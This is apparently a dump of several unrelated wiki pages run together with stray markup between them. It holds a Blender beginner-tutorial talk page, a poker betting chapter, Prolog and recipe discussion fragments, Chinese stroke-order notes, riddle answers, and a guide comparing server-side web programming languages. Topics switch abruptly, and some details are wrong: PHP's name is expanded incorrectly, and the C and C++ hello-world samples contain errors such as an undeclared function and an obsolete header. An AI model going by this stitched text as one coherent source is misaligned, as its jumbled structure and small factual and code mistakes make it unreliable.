What about changing the head object to an UV-Sphere, one could add a lot more detail when editing the head (eyes, nose, mouth)

--[[User:Marty|Marty]] 20:08, 2 Jun 2005 (UTC)


I was unclear whether &quot;top&quot; meant up the screen, or towards me out of the screen. I had to read the whole paragraph and use both selection methods before I worked it out. I've tried to clarify this. BTW I am using this tutorial to try and understand blender as a first time user.

[[User:Pwd|Pwd]] 11:10, 3 Mar 2005 (UTC)


I am a first time user and I found the description of the '''Cursor &gt; Grid''' snap ('''SHIFT+S''') confusing. I expected (from the behavior of other applications i've used that have snap) my mouse cursor to snap to the nearest grid crossing rather than moving freely about. I finally realized that it's purpose is to place the &quot;3d cursor&quot; at the nearest grid intersection from where I click. The description given in this page does not make that clear to first time users, which I feel is the audience for this page.

== box-selection? ==

The term box-selection is uesed as a selection method in lession of &quot;Detailing your Simple Person 1&quot;, but was not explained in any of the lessions previous that one. Therefore, I'm completly lost as of now, and have no clue what I'm doing... Care to help anyone?

: I believe it's referring to the Border Select tool, press the BKEY to activate it.  I'll find the offending entry and fix it.  --[[User:Spiderworm|Spiderworm]] 16:06, 2 Apr 2005 (UTC)

:: I can't find the offending entry.  Somebody care to fill me in?  --[[User:Spiderworm|Spiderworm]] 16:11, 2 Apr 2005 (UTC)

:::Also note that box selection works differently in Blender 2.41; there's now an &quot;Limit selection to visible&quot; toggle button which determines whether non-visible vertices are selected.  And by default, it's ON at startup, so the tutorial won't work right.  --[[User:71.141.22.229|71.141.22.229]] 04:11, 28 June 2006 (UTC)


QUOTE: &quot;'''[Note: this tool creates a box that you resize to select top four (vertices\dots) you are not selecting The (cube\box).]'''&quot; — Um ... not trying to sound snotty, but did I forget how to speak English?  That's unpossible.

Also: '''&quot;Also, make sure the &quot;Limit Selection to Visible&quot; button (bottom right icon of the 3D View header in EDIT Mode) is not selected.&quot;'''  Okay ... color me stoopid.  I can't find that button and it's turning into a 40 minute speed bump.

== How about a copy and paste for the second arm? ==
Since I am brand new to blender, I keep moving through this first tutorial, trying to grasp everything, at the same time looking to add details to the wikibook.  I am not sure how to do it, but is it possible to copy the blocks that make up the first arm and paste them in place for the second arm?  Would that be considered too advanced for this beginner tutorial?
--[[User:Bturnip|Bturnip]] 11:34, 23 Apr 2005 (UTC)

: Select the vertices you want to copy.  Hit '''SHIFT+DKEY'''.  This duplicates the selected vertices.  While holding '''CTRL''' (to constrain movement to increments), move the mouse around and click '''LMB''' when you've positioned it where you want.  Of course, the arm needs to be flipped, so press the '''MKEY''' for mirror.  I'm pretty sure it would need to be flipped on the Global X-Axis.... if I have everything in my head right.  That should do it! --[[User:Spiderworm|Spiderworm]] 02:24, 25 Apr 2005 (UTC)

== Middle Mouse button on Mac? ==

As a Mac User, my work on studying this tutorial came to a screeching halt when I realized I didn't know how to middle click on a Mac. Is there some kind of alternate button?
(Jun 3, '05)
*You are supposed to be able to set the &quot;Emulate 3-button mouse&quot; option but it didn't work for me. Nevertheless, try it out - drag the top header down to reveal the options panel. Choose &quot;View &amp; Controls&quot; and &quot;Emulate 3-button mouse&quot;. (I think its on by default). Then, apparently, you can emulate the middle mouse by holding Alt and left-clicking/dragging. &amp;mdash;[[User:EatMyShortz|EatMyShortz]] 17:36, 22 July 2005 (UTC)

== Printing ==

I just undid changes someone made to print more nicely (moved picture locations, removed a picture, no more bold keyboard shortcuts) - because here, the print view looks ok. Maybe can discuss here if changes actually are needed for printing of this page? [[User:Allefant|Allefant]] 08:18, 16 July 2005 (UTC)

I was trying to follow a tutorial, couldn't select all points with BKEY, and on accident found a toggle to select only visible, or select everything under the lasso.  I cannot find it again, and I have yet to find it mentioned in a tutorial, (which was broken for me,) or anywhere else so far.--  If I sign in

== No Cube ==

My copy of Blender (2.37a) has a flat square on startup. ie. No cube. That invalidates about half of all the pages up to this point. Also, I can't render anything. I just get a black square, regardless of how many lights I add. I have rendered things long ago in Blender, but it looks like this document does more harm than good with new versions of Blender.

I think it is a really bad idea to make assumptions about how the scene will start up. Either provide an example file, or walk the user through every step, starting with an empty scene.
:You've roated the view with the middle button (or Alt-Left button), right?  It took me a bit to figure this out, but I have 2.37a, and I've got a cube (after rotating). --[[User:205.134.213.18|205.134.213.18]] 01:56, 2 October 2005 (UTC) (Spellcheck on Wikipedia)

::I think providing a startup file is a good idea. I will take this idea over to wikiversity at [v:A Hands-On Introduction to Game Design and Production Processes]. We need to get started distributing blender files for some sets of complicated models  released as open source for our learning projects to use anyway.  We are looking at sourceForge for file distribution.  I would like to thank those who are doing these tutorials.  They is definitely doing me much more good than harm and I expect they will continue to improve.  Who premise behind Wikiversity.  [[v:user:mirwin]]

==Question==
Somebody decided to ask this question ''inside'' the tutorial. I'm moving it here to the talk page.
&quot;''Question: what if it says &quot;ERROR: Cannot make polygons with interior vertices&quot;?''&quot; [[User:68.126.1.251|68.126.1.251]] 20:49, 29 October 2005 (UTC)
:Likely that you have a closed shape with a stray vertice somewhere with no connecting edge selected.  Hit the akey toggle several times till everything is unselected in your entire model and then reselect the vertices you wish to work with.  mirwin

I have a similar problem, only the starting square is a cube, all the rest are just flat faces, and in the second stage there isn't any mention on how to remedy that. The end example shows that it needs to be 3D, so please help! anonimous.

== How to scroll around the screen ==

How do I scroll around the screen? I'm trying to make the person in the tutorial but I can't see the head without zooming way out.

I think you're looking for '''Shift + MMB'''.  Make sure you hit Shift 1st, else you'll rotate.  --RavinDave, edited by Cornmeal (changed MMB + Shift to Shift + MMB)

==Circle Selection mistake ?==

I have tried to deselect some vertices by pressing alt + LMB with the circle selection tool activated. But, it seemed to select more vertices instead of deselect them. After that, I tried MMB, and this succesfully deselected the vertices... Juste a small mistake in the text I think, or perhaps a change in a recent release of Blender? GroXx.

== Placing geometry (the head) ==

When I place the head on the body that I've just made, it's too small. How do I scale it up? Thanks.&lt;br&gt;[[User:Pinkmouse|Pinkmouse]] 11:15, 20 October 2006 (UTC)
:When you have the icosphere or other shape you chose as the head selected use the skey and roll the mouse up.  The object should scale up or down depending on how it interprets your mouse motion.  Someone has added this to the tutorial it worked fine for me.  [[v:user:mirwin]]

== MacBooks ==

I think that there are no PowerPC MacBooks. Not sure though.

Yeah, MacBooks are Intel only. The PowerPC Apple notebooks were the iBooks and the PowerBooks.

== Table ==

This guide is awesome :P

I'm making a guide by myself on blender, except this time for a certain game.

Is it ok if I use your table of keys in my guide?

If I could, thank you so much!

~Besh

== Adding the head ==
I added the head, but when I use a modifier on the body, I have to apply the same modifier on the head.  Also moving the body does not move the head.  How to I connect the head to the body, so that they are one object?  [[User:164.58.89.3|164.58.89.3]] 09:07, 25 January 2007 (UTC)

...I have the same issue adding the head. There is no explanation how to connect the head to the body.

== Move the mouse with MMB? ==
In the 'Learning Extrusion' section it tells the use to move the mouse with the MMB. This does not appear to be necessary, the extrusion moves without the use of any button. MMB appears to add additional functionality not needed or explained here. Blender 2.4.2 on PC.

(I agree, same on 2.4.3 for OSX)

== Augh, help ==

Ok well I am doing &quot;modeling a simple person&quot; and I am having trouble with extrusion. Sometimes they are missing a face or two, and sometimes the vertices arent &quot;Shared&quot; for example sometimes when I try to make the connecter segment, it thinks two of the vertices are of the bottom square, and not both so I cant extend regon. And sometimes instead of the cube being like this:


&lt;code&gt;
   []
   []
 [][][]
   []
&lt;/code&gt;
its like this:
&lt;code&gt;
 []
 [][]
 []
&lt;/code&gt;
(cubes flatted out)

== Methods of Selection - display issues ==

Noticing that in IE7 (Win), looking at this Wiki, the image of the &quot;Limit Selection&quot; icon is overlapped by the text block to the right of it. When I refresh the page, the alignment looks fine ''until I move the mouse'' and then it goes back to overlapping again. Do we need to add a ''float'' style or something to the image to make sure it always pushes the text block away? [[User:Garmon Sutrix|Garmon Sutrix]] 15:54, 15 May 2007 (UTC)

== When adding the head... ==


When I get to the point adding the head do I need to be in object mode with nothing selected or in just in edit mode?

--[[User:Gilgamesh007|Gilgamesh007]] 17:14, 27 May 2007 (UTC)

== Noob note under &quot;Methods of Selection&quot; / &quot;7. Face Selection&quot; out of place? ==

Is it me or is the Noob Note in 7. Face Selection out of place? I don't understand the point it is trying to make and when I do as the note says (just to see what happens) I end up extruding a face, which is only introduced in the next section.

== Selecting the head selects the body ==

I suppose there's some conceptual link between the head and the body, such as &quot;both belong to the same object&quot;. But if two seemingly independent objects on the screen may belong to the ''same'' object, this needs to be explained here. I got stuck for a while because I couldn't select only the head (to move it down to the neck). In the end I moved it using the Z axis, but I found no way of moving it freely. Whenever I select it, the body is selected too.

... I did not find that the head and the body moved together.  There must be some difference in versions that account for this.

== Extrudes Only on a Diagonal path ==

I can get everything to work right except i cannot do anything but extrude on a diagonal path. I attempted to switch views to see if it is affected. however it is not
I'm on 2.62

== Extrude faces instead of edges. ==

Shouldn't the person build itself by extruding faces instead of edges? It would probably be easier because then you don't have to press &quot;Region&quot; before each extrusion. --[[Special:Contributions/76.90.9.191|76.90.9.191]] ([[User talk:76.90.9.191|talk]]) 17:15, 29 March 2010 (UTC)

== Making it 3D ==

I'm having a problem after I extrude - I only extruded one face. How do I make the square into a cube?[[Special:Contributions/68.36.206.39|68.36.206.39]] ([[User talk:68.36.206.39|talk]]) 22:34, 11 July 2010 (UTC)

== Selection mehtods ==

Make sure the Occlude background geometry option is &quot;on&quot;.

Shouldn't that be &quot;off&quot;? The screen shot shows it off.</text>

      <text xml:space="preserve">== Betting ==
Specifics of betting vary from game to game. Before a hand begins, most games either use an ''ante'' or a ''blind bet'', and some games use both. An ante is usually a fraction of a normal bet size. Blind bets are used with games that have a ''dealer button'' (also called a ''puck'' or ''button''), hereafter simply ''button'' to refer to both the button itself and to the player who holds it. With an ante, every player must toss a chip or coin of a given denomination into the pot before receiving his or her cards. Blind bets may also appear in the form of ''bring-in'' bets in stud games, where the player with the lowest (or highest) card showing on the first round must either &quot;bring it in&quot; for a set amount (usually half a small bet) or make a full small bet. The player making the bring-in cannot fold.

In games that use a dealer button, the most common structure is a two-blind structure. In this, the player to the button's left posts a ''small blind'' (usually half a bet, rounded either up or down if this results in an awkward bet size), and the person to the left of the small blind posts the ''big blind'', generally a full bet size. The players then all receive their cards, the other players receiving them at no cost. The player to the big blind's left must then call, raise, or fold to the big blind, and betting continues normally. But what is normally?

In a normal betting round, there must be some means of determining who goes first. In games that use a button, it will always be the player to the button's left (except in the first betting round, in which case it is the player to the big blind's left; this position is called ''under the gun''). Other games use various schemes. The player who goes first must check or bet. To ''check'' is to pass on the chance of betting, and the player to his or her left faces the same choice. If all players check, nobody may bet and the next round continues. When somebody bets, all other players must decide, one at a time (starting from the bettor's left) whether to call, raise, or fold. To ''call'' the bet is to put the same amount of money into the pot. To ''raise'' is to call and also add ''more'' money to the pot. To ''fold'' (''lay down your hand'') is to stop playing the hand, giving up any money invested in the pot. The round of betting ends when all players who have not folded have called the last raise (so each player who has not folded contributes the same amount to the pot). A player who bets and folds to a raise loses the bet he or she made, even though the player folded on the same betting round. For this reason, it is advantageous to act last; in a game with a dealer button, the player who has the button always acts last (except in the first betting round, since the blinds get the option to raise).

To confuse matters further, there are several ways to play betting rounds, which are usually unrelated to the game itself (for example, [[../Five card draw|five card draw]] can be played spread limit, fixed limit, pot limit, or no limit).
* ''Spread limit'', also called ''straight limit'', is a common method in home games: throughout a hand, there is a lower limit and an upper limit, for example, $1 to $5, and these limits usually do not change. Spread limit is rarely found in casinos.
* ''Fixed limit'' means each bet and raise is a fixed size. A fixed limit table usually doubles the bet size for the last couple of betting rounds, so fixed limits are often described as, say, $2/4, which, if it describes a Texas hold'em game, means the small blind is $1 (half the big blind), the big blind is $2, the flop is $2, the turn is $4, and the river is $4.
* ''Pot limit'' is like spread limit except the maximum bet size is always the size of the pot. Like fixed limit, the minimum bet size is often doubled at a certain point.
* ''No limit'' means there is no upper limit at all, although this is almost always combined with a rule (called &quot;table stakes&quot;) that you can only bet with chips that were in play at the beginning of the hand. This means that when you start a hand of no limit poker, you know that your maximum exposure to risk is limited to the value of chips in front of you. Like fixed limit, the minimum bet size is often doubled at a certain point.

[[../Omaha|Omaha hold'em]] is often played pot limit but is almost never played no limit. Stud poker is usually either spread limit or fixed limit. A beginning player is strongly urged ''not'' to play pot limit or no limit, no matter how low the stakes are, until at the very least the player is well acquainted with the rules to the game.

=== The purpose of forced bets ===
All serious poker games involve some element of forced bets. As described above, this can have take several forms, but will always involve at least one player being forced to put money in the pot. Why is this so important to a poker game?

Consider a game of poker where there are no forced bets. Since you can look at your hand before you choose whether to bet, there's no point in putting any money on the table unless you're almost certain that your hand will be a winner. You might fold 99 hands out of 100 and still make a profit. Of course, your opponents, if they are rational, will think and bet exactly the same way. Such a poker game would consist of hand after hand where everyone folded, and the occasional hand where one person bet and everyone else folded. Money would only change hands on the very rare occasions when two people got extremely good hands at the same time.

To counter this, poker games have a forced bet element. If you fold too many hands, you'll end up losing out as you'll pay the forced bets but get very few payoffs to justify the money expended. Forced bets provide a reason for you to bet even if the forced bet hasn't come out of your stack (as is the case in most hands when blind bets are being used): since the player who made the forced bet may have any hand at all, you have a good chance of beating them with any hand that is above average.

The opposite problem can happen if the forced bets are too large. If you are in a game where the ante is half your entire stack, you'll play almost any hand since you'll go bust in a couple of hands anyway. In general it's correct to play more loosely (call and bet with a wider range of cards) the higher the forced bets are relative to the average stack size.

This can be used in tournament play to control the length of the tournament. As the tournament progresses, the size of the blinds is increased so that players are forced to play their hands more aggressively or risk going bust just from paying the blinds.

== Variations between compilers ==

Would it be a good idea to add differences between different compilers? Or at least a note that there might be differences?

For example, I use the Windows port of the GNU Prolog compiler. After it iterates through all the possible results, it answers &quot;yes&quot; instead of &quot;No&quot; if there is more than one result.

This might be confusing to some. Thoughts?

== Hello, Person! ==

I think it would be nice to have a program that asks the person his/her name, '''inputs the string''', and replies with 'Hello, ', Person, '!'. I learned prolog 20 years ago, I could write this, but now it seems that I can't - there's no way I can input a string in prolog :-/ [[User:Albmont|Albmont]] ([[User talk:Albmont|talk]]) 14:24, 21 July 2008 (UTC)

== binding inconsistency ==
Are ''binding, unification,'' and ''instantiation'' all clearly differentiated and used consistently? E.g.,&lt;br/&gt;
&quot;Prolog will try to '''bind''' a term to the variable.&quot; &lt;br/&gt;
&quot;In the example above, prolog will first find human(david) in the program and ''unify'' A with david&quot;

::I've looked at a few pictures of Mille Crepes and it looks like it's just a bunch of layers of crepes, with filling of some sort in between. In one picture I saw fruits inside. So, it seems pretty simple to make. I'll go digging for a recipe for this from a book.

==Sizes / multiple sheets?==

Uh so this doesn't make any kind of sense:

&quot;Trim the pastry so that you are left with a rectangle approximately 23 x 25.5 cm. Roll out the larger piece of pastry to a 30cm square...&quot;

The first bit makes it sounds as though you are dealing with one piece of puff pastry. The second step, by saying &quot;the larger piece,&quot; makes it sound as if there are two. And if you're going to be rolling it out to a specified dimension, why measure it so precisely - or trim it - when it's in its pre-rolled state? Am I missing something obvious, or has a step been omitted / added wrongly here? [[User:Jessicapierce|Jessicapierce]] 01:02, 3 May 2007 (UTC)</text>

      <text xml:space="preserve">SOS in WWII was primarily made with ground meat not dried chipped beef. The dried chipped beef was a Naval meal called foreskins on toast. There was more room to carry dried and smoked meats on ships and subs then there was for fresh meat.

Shouldn't this be in odds and ends.

Check out this article: http://www.seabeecook.com/cookery/cooking/cooking_sos.htm

It's not clear to me that cooks generally prepared SOS according to the 1910 recipe, even though it was in the book until 1944.  For one thing, it sounds like many/most cooks knew to soak the beef before using it, so that it wouldn't be incredibly salty.  For another, later recipes were creamier, and it's not clear to me whether that was because the standard practice was not to follow the book recipe, and eventually the book was updated, or if most cooks did make it according to the 1910 recipe (but likely with soaking to reduce salt) until 1944.

Is it 1/4 ounce pepper, that is 7g or 1/4 pound for 110g ? I'd rather bet the former !

One of Blender's powerful features is its Python API. This allows you to interface with Blender through the Python programming language. The Python interface allows you to control almost all aspects of Blender, for example you can write import or export scripts for meshes and materials of various formats or create procedurally generated textures. You can also create complete animations procedurally and write scripts to modify existing scenes in any way you can think of. On top of all, you can easily create a user interface for your script, transforming it into a generally usable tool.

The relevant section of the Blender User’s Manual is [http://wiki.blender.org/index.php/Doc:2.6/Manual/Extensions/Python here].

Download Python Scripts from the Blender site [http://wiki.blender.org/index.php/Extensions:Py/Scripts/Catalog here].

[http://blenderartists.org/forum/forumdisplay.php?f=11 This forum] on blenderartists.org discusses Python scripting.

You can't use functions instead of numbers.

      <text xml:space="preserve">Generally speaking, the strokes in Chinese characters are written from top to bottom, left to right.

==Chinese Characters==
There are several stroke order rules for Chinese characters: top to bottom, left to right, inside to outside.
For example, the Chinese character for &quot;hit&quot;, 打, the left part is written from top to bottom, then the right part is written from top to bottom.  The order in which the characters are written can be expressed through drawing a tree diagram.
An example of inside to outside stroke order is in the character for &quot;round&quot;, 圓.  The top two strokes of the box on the outside is written first (because of top to bottom order), then the inside is written top to bottom, and the bottom horizontal stroke is written last to enclose it.

=== Exceptions ===
There are many stroke order exceptions in Chinese orthography.
For example in the character &quot;上&quot;, meaning &quot;up&quot;, the middle horizontal line is written first, then the vertical stroke, then the bottom stroke.  This is an exception to the left to right stroke order rule.

#She is a music box
#She is on life support in a hospital and the power fails.
#She was a tight rope walker who did her act blindfolded. She knew she reached the opposite end of the rope when the band that was beneath her stopped playing. However, one day the lead conducter was sick, and the replacement did not know the trick. So when he stopped (early), the tight rope walker thought she had reached the end and walked off to her death.
#She was a bug at a party. She was sitting on a chair that people were using for musical chairs, and when the music stopped, a child sat on her.
#She was driving in a car listening to the radio. She crashed into a cement pole. The radio, being closer to the front of the car, was destroyed a split second before she was.

#His parachute did not open.
#The man was actually Abraham Lincoln and 'the field' is the nickname for the theater he was in during his assassination. There is no one else in 'the field' because the theater was evacuated. The rucksack on his back was a late 1850's man-purse that was common during that era for theater-goers.

Choosing the right programming language ''for server-side applications''.
(Choosing the right programming language for browser-site rollovers, animation, and validation -- CSS, JavaScript, Java, or Flash -- is discussed ... &lt;!-- where? --&gt; ...).

When it comes to the perfect programming language for the development of your site, it is imperative that you understand that '''there is no perfect programming language'''. Once you understand this, it is simply a matter of choosing the language that best serves your needs. Before you decide on what language to use, you should consider the following

*your server platform
*the server software you run
*your budget
*previous experience in programming
*the database you have chosen for your backend

The Operating system you are running on your system is your platform and your choice of OS may play a major part in the language you choose. Be aware that unforeseen problems may push you to change platforms in the future, and that some language choices will make this very painful. Microsoft Windows and POSIX-compliant unix-like systems will most likely be your two main choices in technology. 

Once you have chosen your OS, the next choice is your server software. On Windows systems, you have IIS which comes installed for free with windows. It has a long history of performance and security problems. Many of the web servers commonly used on POSIX-compliant unix-like systems are available for Windows too, including the very popular and well-respected Apache web server.

&quot;POSIX-compliant unix-like systems&quot; includes a plethora of available OSes including but not limited to Linux, Sun Solaris, BSD, and Mac OS X. Apache is by far the most common web server for these systems and for web serving in general.

While some of the available programming languages are free under the GNU Public License or other open-source licences, others are commercial products and carry a licensing fee. The commercial products do carry the advantage of commercial support and tighter integration with the companies' other products, so if you have a large amount of capital and want to get your site set up quickly with little configuration, then a commercial solution might be your better option. Some of us, however, cannot afford the high price tag of the commercial solutions on the market and may elect to make use of the free yet still very powerful languages available. The tradeoff is the effort in properly configuring the environment which may or may not be worth the cost savings.

== The Most Popular Programming Languages ==

The following are a list of the most popular languages used in the industry today. This is by no means exhaustive or complete and it is up to you to personally research each option to choose the right language for you.


=== Java/Servlet/JSP ===
*Type: Interpreted or Compiled (for Virtual Machine)
*website: [http://www.oracle.com/technetwork/java/index.html Oracle]
*License: --------- 

Java is a powerful,open source,robust and secure web-based program that can run as standalone program or an applet embedded in a website.

Servlets (controller), JSP (view), Java (model) creates web-based applications using MVC ({{wp|Model–view–controller}}).
For creating robust secure web-application Java has many frameworks like [http://en.wikipedia.org/wiki/Apache_Struts Struts],[http://en.wikipedia.org/wiki/Spring_Framework Spring] and more in [http://en.wikipedia.org/wiki/Comparison_of_web_application_frameworks web_application_frameworks].

'''Example code'''
&lt;source lang=Java&gt;class HelloTest {
  public static void main(String[] args) {
    System.out.println(&quot;Content-type: text/html\n&quot;);
    System.out.println(&quot;Hello World!&quot;); //Display the string.   
  }
}
&lt;/source&gt;

[http://docs.oracle.com/javase/tutorial/index.html Java Tutorials]

JavaServer Pages (JSPs) are web pages with embedded Java code.  The embedded Java code is executed on the server, then the page is returned to the browser for display.

'''Example code'''
&lt;source lang=Java&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;A JSP Example&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;% out.println(&quot;&lt;p&gt;Hello there!&lt;/p&gt;&quot;); %&gt;
  &lt;/body&gt;
&lt;/html&gt;
&lt;/source&gt;

=== Perl ===
*Type: Interpreted script language, Compilable into binary executable or platform-compatible Bytecode
*website: [http://www.perl.com perl.com]
*License: Open source [free]

insert content here

'''Example code''' (using [http://www.perldancer.org/ Dancer] Perl framework)
&lt;source lang=perl&gt;#!/usr/bin/env perl
use Dancer;
get '/' =&gt; sub
 {
  &quot;Hello World!&quot;
 };
dance;
&lt;/source&gt;


=== PHP ===
*Type: Interpreted script language, Compilable
*Website: [http://www.php.net php.net]
*License: Open source [free]

PHP is a recursive acronym for PHP Hypertext Processor. Unlike the other offerings listed, PHP is designed specifically for server-side programming, which means that its library is specialized for the tasks you'll be doing over and over again in the course of programming your website. PHP also has the advantage of being able to interweave code with HTML, thus allowing you to mix layout with programming. While this may simplify coding for small sites, it does carry the potential to be abused, resulting in difficult to manage or maintain code for larger projects. Proper use of a templating system such as [http://smarty.php.net/ Smarty] should do wonders towards preventing that. PHP is available for most operating systems including Unix and Windows, and is an excellent server-side programming language for professional programming.

'''Example code'''
&lt;source lang=php&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;PHP Hello World&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;?php echo &quot;hello world&quot;; ?&gt;
    &lt;/body&gt;
&lt;/html&gt;
&lt;/source&gt;

Or a feature that really shows that PHP is designed for the web is something like this.

&lt;source lang=php&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;PHP Hello World&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;?php
        if(isset($_GET['showHtml']))
        {
             ?&gt;
             &lt;h1&gt;The GET variable showHtml is set.&lt;/h1&gt;
             &lt;?php
        }
        ?&gt;
    &lt;/body&gt;
&lt;/html&gt;
&lt;/source&gt;

In this case if &quot;showHtml&quot; is set (using &quot;?showHtml&quot; in the URL), the code will display the h1. This way you will not have to use echo or print to print HTML.

=== C ===
*Type: Compiled
*Website:
*License:

The C programming language is a standardized programming language developed in the early 1970s by Dennis Ritchie for use on the UNIX operating system. It has since spread to many other operating systems, and is one of the most widely used programming languages. C is prized for its efficiency, and is the most popular programming language for writing system software, though it is also used for writing applications.

C is a useful language to learn since similar syntax is used by many modern languages such as Java, PHP, and JavaScript.

'''Example code'''
&lt;source lang=c&gt;
#include &lt;stdio.h&gt;
int main() {
   printf(&quot;Content-Type: text/html\r\n\r\n&quot;);
   printf(&quot;&lt;html&gt; &lt;head&gt;\n&quot;);
   printf(&quot;&lt;title&gt;Hello, World!&lt;/title&gt;\n&quot;);
   printf(&quot;&lt;/head&gt;\n&quot;);
   printf(&quot;&lt;body&gt;\n&quot;);
   printf(&quot;&lt;h1&gt;Hello, World!&lt;/h1&gt;\n&quot;);
   printf(&quot;&lt;/body&gt; &lt;/html&gt;\n&quot;);
}
&lt;/source&gt;

'''More Example code'''
&lt;source lang=c&gt;
#include &lt;stdio.h&gt;

int main() {
    show();
}

void show() {
    printf(&quot;hello&quot;);
}
&lt;/source&gt;

=== C++ ===
*Type: Compiled
*Website: http://www.research.att.com/~bs/C++.html
*License:

Originally released as &quot;C with Classes&quot; around 1982, C++ was designed by Bjarne Stroustrop to be a superset of C. With its compatibility with C, it became quite popular. In 1983 C with Classes was revised and renamed C++. It was summarized in the book, &quot;The C++ Programming Language&quot; by Stroustrop, Addison Wesley, 1985. The goal was to add programming language features that support data abstraction and object-oriented concepts to C. In 1990 the book entitled &quot;The Annotated C++ Reference Manual,&quot; by Ellis and Stroustrop, Addison Wesley became the defining document.

'''Example code'''
&lt;source lang=c&gt;
#include &lt;iostream.h&gt;
using namespace std;
int main() {
   cout &lt;&lt; &quot;Content-Type: text/html\r\n\r\n&quot;;
   cout &lt;&lt; &quot;&lt;html&gt; &lt;head&gt;\n&quot;;
   cout &lt;&lt; &quot;&lt;title&gt;Hello, World!&lt;/title&gt;\n&quot;;
   cout &lt;&lt; &quot;&lt;/head&gt;\n&quot;;
   cout &lt;&lt; &quot;&lt;body&gt;\n&quot;;
   cout &lt;&lt; &quot;&lt;h1&gt;Hello, World!&lt;/h1&gt;\n&quot;;
   cout &lt;&lt; &quot;&lt;/body&gt; &lt;/html&gt;\n&quot;;
   return 0;
}
&lt;/source&gt;

=== ColdFusion ===
*Website: [http://www.adobe.com Adobe]
*License: Multiple available [http://www.adobe.com/products/coldfusion/]

[[Programming:ColdFusion]]

ColdFusion is a scripting language based on standard HTML that is used to write dynamic Web sites. It allows you create dynamic pages quickly and easily, including querying data from a database, use hundreds of built in tags and functions, or creating full scale object oriented enterprise level applications. ColdFusion pages can consist largely of standard HTML tags intermingled with ColdFusion Markup Language (CFML) tags, or can implement custom frameworks designed to assist the developer in separating presentation from business logic (e.g. with the MVC design pattern).  ColdFusion was introduced by Allaire in 1996 and acquired by Macromedia in a merger in April 2001 and by Adobe in 2005.  As an Adobe product, ColdFusion developers have the advantage of leveraging many existing Adobe technologies seamlessly.  Examples of such integration can be seen in the dynamic generation of Adobe Acrobat .pdf documents, Adobe Flash forms and presentations, Adobe Flash remoting capabilities, as well as connection with Adobe Flex user interfaces.

'''Example code'''
&lt;pre&gt;
&lt;cfset myVar = &quot;Hello World!&quot;&gt;

&lt;cfoutput&gt;
  &lt;html&gt;
    &lt;body&gt;
      #myVar#
    &lt;/body&gt;
  &lt;/html&gt;
&lt;/cfoutput&gt;
&lt;/pre&gt;

=== ASP ===
*Website: [http://www.microsoft.com Microsoft]
*License: ---------

ASP, or Active Server Pages combine html and server-side code (processed on the server and displayed as html) to create webpages with embedded functionality and scripts (see the code example).

'''Example code'''
&lt;source lang=asp&gt;
&lt;html&gt;
&lt;body&gt;

&lt;%
dim name
name=&quot;Donald Duck&quot;
response.write(&quot;My name is: &quot; &amp; name)
%&gt;

&lt;/body&gt;
&lt;/html&gt;
&lt;/source&gt;


=== C# ===
*Type: Compiled (for Virtual Machine)
*website: [http://www.microsoft.com Microsoft]
*License: ---------

C# (pronounced &quot;C Sharp&quot;) is a multi-paradigm programming language encompassing imperative, functional, generic, object-oriented (class-based), and component-oriented programming disciplines. It was developed by Microsoft within the .NET initiative and later approved as a standard by Ecma (ECMA-334) and ISO (ISO/IEC 23270). C# is one of the programming languages designed for the Common Language Infrastructure.

C# is intended to be a simple, modern, general-purpose, object-oriented programming language. Its development team is led by Anders Hejlsberg, the designer of Borland's Turbo Pascal. It has an object-oriented syntax based on C++. It was initially named Cool, which stood for &quot;C-like Object Oriented Language&quot;.[2] However, in July 2000, when Microsoft made the project public, the name of the programming language was given as C#. The most recent version of the language is 4.5 which was released in 2012.

'''Example code'''
&lt;source lang=c&gt;
class ExampleClass
{
    static void Main()
    {
        System.Console.WriteLine(&quot;Hello, world!&quot;);
    }
}
&lt;/source&gt;


===WebDNA===
*Type: Interpreted script language with built-in database system
*Website: [http://www.webdna.us www.webdna.us]
*License: Freeware

WebDNA is an easy to learn language with hybrid [http://en.wikipedia.org/wiki/In_memory_database in-memory databases] specifically designed for server-side programming. It uses a relatively small set of instructions that can be combined to build sophisticated database-driven websites. WebDNA code can interweaves with css, html, html5 and ajax, allowing to mix layout with programming and sever-side with client-side. Some instructions allow to interact with remote servers.

WebDNA is available for most operating systems including Unix, OS X and Windows.

'''Example code''' (connects to a whois server and shows the information)
&lt;pre&gt;
&lt;!--HAS_WEBDNA_TAGS--&gt;
&lt;html&gt;
   &lt;head&gt;
      &lt;title&gt;WebDNA example 1&lt;/title&gt;
   &lt;/head&gt;
&lt;body&gt;

[text]info=[tcpconnect host=whois.domaindiscover.com&amp;port=43]
[tcpsend]webdna.us[unurl]%0D%0A[/unurl][/tcpsend]
[/tcpconnect][/text]

&lt;/body&gt;
&lt;/html&gt;
&lt;/pre&gt;

'''Example code''' (store the previous information in a database)
&lt;pre&gt;
&lt;!--HAS_WEBDNA_TAGS--&gt;
&lt;html&gt;
   &lt;head&gt;
      &lt;title&gt;WebDNA example 2&lt;/title&gt;
   &lt;/head&gt;
&lt;body&gt;

[append db=base.db]domain=webdna.us&amp;whois=[info]
[/append]

&lt;/body&gt;
&lt;/html&gt;
&lt;/pre&gt;

Once you have chosen an appropriate language (''see 5.3: Choosing the right programming language''), it is important to code your website well. Cleanliness is both important and respected among programmers, and an effective, efficient algorithm will be appreciated by the end users.

You should '''plan the logical layout''' of your website code beforehand, with the methods, objects, etc., and their purposes clearly defined and related. Be precise with this pre-planning. Draw it on a napkin, type it out, do whatever you have to to get a concrete understanding of your backend's structure beforehand. This will come in handy. Oftentimes, programmers say that planning is the most important stage of programming (that and bug-testing).

Aside from planning ahead, here are some other general guidelines:

*'''Keep an online manual for your language open''' at the same time you're coding, in case you need to look up an obscure function or precise syntax.
*Be sure to '''never use outdated algorithms''' or tags. Tags like &lt;nowiki&gt;&lt;marquee&gt; and &lt;font&gt;&lt;/nowiki&gt; are no longer standard HTML tags. Syntax for languages is always being updated. Make sure you're coding in the most recent version of the language. Backwards and forwards compatibility are important. Don't use code that is already outdated, and if the manual says a function will probably be discarded in a future update, don't use it.
*It's important to '''comment''' your code, in case someone else takes over for you at some point. This is also important for when you have to update your code in the future, in case you forget your own logic.
